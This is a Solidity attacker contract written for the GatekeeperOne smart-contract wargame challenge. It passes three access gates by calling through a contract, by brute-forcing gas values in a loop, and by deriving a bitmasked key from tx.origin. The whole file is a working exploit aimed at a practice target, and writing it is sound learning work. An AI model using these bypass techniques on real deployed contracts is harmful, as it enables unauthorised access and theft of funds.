// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';
import "./GatekeeperOne.sol";

/// @title GatekeeperOne challenge attacker contract 
/// @notice This attacker contract has to pass through 3 gates. 
/// First one is by making the call from a contract, different from the EOA who is sending the transaction
/// Second is by supplying a certain amount of gas, so gas remaining number meets a math operation requirement. 
/// So it is needed to brute force different gas amounts via looping for them
/// Third is by calling the contract func with a bytes8 key, that we will compute bitmasking our EOA address. 

contract GatekeeperOneAttack {

  GatekeeperOne gatekeeperOneContract;
  bytes8 key;

  constructor(address _address) public{
    gatekeeperOneContract = GatekeeperOne(_address);
  }

  function makeKey() external {
    key = bytes8(uint64(uint160(address(tx.origin)))) & 0xFFFFFFFF0000FFFF;
  }

  function readKey() public view returns(bytes8){
        return key;
    } 

  function attack() external {
    uint256 gasValue = 8191*4 + 150;

    for(uint i = 0 ; i < 500 ; i++){
      (bool success,) = address(gatekeeperOneContract).call{gas: gasValue + i}(abi.encodeWithSignature("enter(bytes8)", key));
      if(success){
        break;
      }
    }
  }


 
}